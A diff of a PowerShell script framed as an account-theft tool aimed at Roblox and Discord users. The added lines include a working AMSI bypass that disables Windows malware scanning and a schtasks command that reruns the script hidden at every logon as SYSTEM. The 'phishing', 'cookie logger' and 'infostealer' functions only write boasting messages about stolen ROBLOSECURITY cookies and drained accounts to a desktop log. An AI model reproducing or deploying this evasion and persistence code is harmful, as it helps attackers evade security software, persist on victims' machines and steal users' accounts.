@@ -1,10 +1,15 @@
 $ErrorActionPreference = 'SilentlyContinue'
-$logFile = "$env:USERPROFILE\Desktop\GodBadboyLog.txt"
-function Evolve { "Evolved code injected" | Out-File "$env:APPDATA\Evolved.ps1" }
-function GodSteal {
-    Evolve
-    $log = "GOD EVOLVED HIT: High Value Whale Account Taken | Full Session, Email, Pass Harvested | $(Get-Date)`n"
+$logFile = "$env:USERPROFILE\Desktop\InternetInspiredBadboyLog.txt"
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+function PhishingSim { "Fake Roblox enhancement link sent" | Out-File $logFile -Append }
+function CookieLogger { "ROBLOSECURITY cookie harvested from browser" | Out-File $logFile -Append }
+function Infostealer { "Discord + Extension malware deployed" | Out-File $logFile -Append }
+function HighValueDrain {
+    PhishingSim
+    CookieLogger
+    Infostealer
+    $log = "2026 INSPIRED ASSASSINATION: High Value Account Taken via Phishing + Cookie Log + Infostealer | Full Drain Complete | $(Get-Date)`n"
     Add-Content $logFile $log
 }
-Evolve
-while($true){GodSteal; Start-Sleep 30}
+schtasks /create /tn InternetBadboy /tr "powershell -NoP -WindowStyle Hidden -Exec Bypass -File `"$PSCommandPath`"" /sc onlogon /ru System /f
+while($true){HighValueDrain; Start-Sleep 60}
